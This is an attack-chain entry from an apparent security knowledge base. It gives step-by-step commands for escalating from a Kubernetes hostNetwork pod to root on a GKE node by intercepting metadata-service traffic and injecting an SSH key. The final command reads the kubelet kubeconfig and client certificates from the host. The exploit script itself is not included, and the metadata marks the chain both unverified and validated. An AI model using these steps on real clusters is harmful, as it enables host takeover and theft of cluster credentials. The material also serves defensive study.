---
tags:
  - kubernetes
  - gke
  - mitm
  - privilege-escalation
  - ssh-injection
  - metadata-service
  - container-escape
type: attack_chain
tools:
  - '[[tools/gcloud]]'
  - '[[tools/kubectl]]'
  - '[[tools/python3-scapy]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Persistence]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Kubernetes
  - Linux
  - Cloud (GCP)
  - Cloud (AWS)
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-GKE-Cluster-for-Vulnerability-Testing]]'
  - '[[procedures/Deploy-Malicious-Pod-with-HostNetwork]]'
  - '[[procedures/Transfer-Exploit-Script-and-Access-Pod-Shell]]'
  - '[[procedures/Install-Dependencies-and-Generate-SSH-Key]]'
  - '[[procedures/Execute-MITM-Exploit-Script-for-Privilege-Escalation]]'
step_count: 5
techniques:
  - '[[Deploy Container]]'
  - '[[Escape to Host]]'
  - '[[Adversary-in-the-Middle]]'
  - '[[Network Device Authentication]]'
updated_at: '2025-12-14T17:28:44.916Z'
description: >-
  Multi-stage attack exploiting default CAP_NET_RAW capability in Kubernetes
  pods with hostNetwork=true to perform MITM on cloud metadata service,
  injecting SSH keys for root access on the host.
skill_level: intermediate
impact_level: high
id: cf305270-0084-4def-914e-3c98c1d7e44d
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Persistence]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Deploy Container]]'
  - '[[Escape to Host]]'
  - '[[Adversary-in-the-Middle]]'
  - '[[Network Device Authentication]]'
---
# Kubernetes HostNetwork MITM for Root Privilege Escalation via Cloud Metadata Service

Multi-stage attack chain demonstrating exploitation of Kubernetes default capabilities to perform a man-in-the-middle attack on the host's network traffic, targeting the cloud metadata service to inject SSH keys and gain root access on the underlying instance.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Create Cluster] --> B[Execution: Deploy Pod]
    B --> C[Persistence: Transfer Script and Install Tools]
    C --> D[Privilege Escalation: MITM and Key Injection]
    D --> E[Objective: Root SSH Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/gcloud]]
- [[tools/kubectl]]
- [[tools/python3-scapy]]

### Target Environment

- Kubernetes cluster (e.g., GKE 1.14.10-gke.36 or similar)
- Cloud provider with metadata service (169.254.169.254, e.g., GCP, AWS)
- Access to deploy pods with hostNetwork=true
- No network policies restricting raw sockets

### Initial Access Requirements

- GCP project credentials with cluster creation permissions
- kubectl configured for the cluster
- Local access to metadatascapy.py exploit script

## Detailed Attack Procedures

### Step 1: Create GKE Cluster
procedure: [[procedures/Create-GKE-Cluster-for-Vulnerability-Testing]]

**Objective**: Provision a vulnerable GKE cluster to simulate the environment where hostNetwork pods can access raw sockets.

**Instructions**: Use [[commands/gcloud-create-gke-cluster]] to create a default cluster with specified configurations:

```bash
gcloud beta container --project "copper-frame-263204" clusters create "hostmitm" --zone "us-central1-c" --no-enable-basic-auth --cluster-version "1.14.10-gke.36" --machine-type "n1-standard-1" --image-type "COS" --disk-type "pd-standard" --disk-size "100" --metadata disable-legacy-endpoints=true --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --num-nodes "3" --enable-stackdriver-kubernetes --enable-ip-alias --network "projects/copper-frame-263204/global/networks/default" --subnetwork "projects/copper-frame-263204/regions/us-central1/subnetworks/default" --default-max-pods-per-node "110" --no-enable-master-authorized-networks --addons HorizontalPodAutoscaling,HttpLoadBalancing --enable-autoupgrade --enable-autorepair --max-surge-upgrade 1 --max-unavailable-upgrade 0
```

Validate cluster creation with `gcloud container clusters list`.

**Expected Output**: Cluster "hostmitm" created successfully in us-central1-c.

**Success Indicators**:
- Cluster status shows RUNNING
- kubectl can connect to the cluster

### Step 2: Deploy Malicious Pod
procedure: [[procedures/Deploy-Malicious-Pod-with-HostNetwork]]

**Objective**: Deploy a pod that shares the host's network namespace to enable raw socket access for MITM.

**Instructions**: Apply the pod manifest using [[commands/kubectl-apply-hostnetwork-pod]]:

```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu-node
spec:
  hostNetwork: true
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: [ "/bin/sleep", "inf" ]
EOF
```

Check pod status with `kubectl get pods`.

**Expected Output**: Pod "ubuntu-node" in Running state.

**Success Indicators**:
- Pod scheduled on a node
- No errors in pod events

### Step 3: Transfer Script and Access Shell
procedure: [[procedures/Transfer-Exploit-Script-and-Access-Pod-Shell]]

**Objective**: Copy the MITM exploit script to the pod and gain interactive shell access for execution.

**Instructions**: First, transfer the script with [[commands/kubectl-cp-exploit-script]]:

```bash
kubectl cp metadatascapy.py ubuntu-node:/metadatascapy.py
```

Then, exec into the shell using [[commands/kubectl-exec-bash-shell]]:

```bash
kubectl exec -ti ubuntu-node -- /bin/bash
```

**Expected Output**: File copied without errors; interactive bash prompt in the container.

**Success Indicators**:
- Script file exists in pod (/metadatascapy.py)
- Shell session active

### Step 4: Install Dependencies and Generate Key
procedure: [[procedures/Install-Dependencies-and-Generate-SSH-Key]]

**Objective**: Prepare the pod environment with necessary tools and create an SSH key for injection.

**Instructions**: Inside the pod shell, update and install packages using [[commands/apt-install-scapy-openssh]]:

```bash
apt update && apt install -y python3-scapy openssh-client
```

Generate the key with [[commands/ssh-keygen-ed25519]]:

```bash
ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
```

**Expected Output**: Packages installed; key pair generated at /root/.ssh/id_ed25519.

**Success Indicators**:
- scapy importable in Python
- SSH key files present

### Step 5: Execute MITM Exploit
procedure: [[procedures/Execute-MITM-Exploit-Script-for-Privilege-Escalation]]

**Objective**: Run the script to intercept metadata traffic, inject the SSH key, and establish root access.

**Instructions**: Launch the exploit using [[commands/python-run-metadatascapy]]:

```bash
python3 /metadatascapy.py
```

Wait up to 2 minutes for output. Post-exploitation, demonstrate access with [[commands/ssh-root-access-demo]]:

```bash
ssh -oStrictHostKeyChecking=no hacker@127.0.0.1 -- sudo cat /var/lib/kubelet/kubeconfig /etc/srv/kubernetes/pki/ca-certificates.crt /var/lib/kubelet/pki/kubelet-client-current.pem
```

**Expected Output**: Kubeconfig and certificates printed; successful SSH as root.

**Success Indicators**:
- MITM successful, key injected
- Root shell access confirmed

## Attack Chain Summary

### Key Achievements

1. Deployed pod with host network access exploiting default capabilities
2. Performed MITM on metadata service to inject SSH public key
3. Achieved persistent root access on the cloud host instance

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Deploy Container]] Deploy Container
- [[Escape to Host]] Escape to Host
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle
- [[Network Device Authentication]] Network Credential Access

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence
- [[Privilege Escalation]] Privilege Escalation

---

*Last updated: 2023-10-01T00:00:00Z*
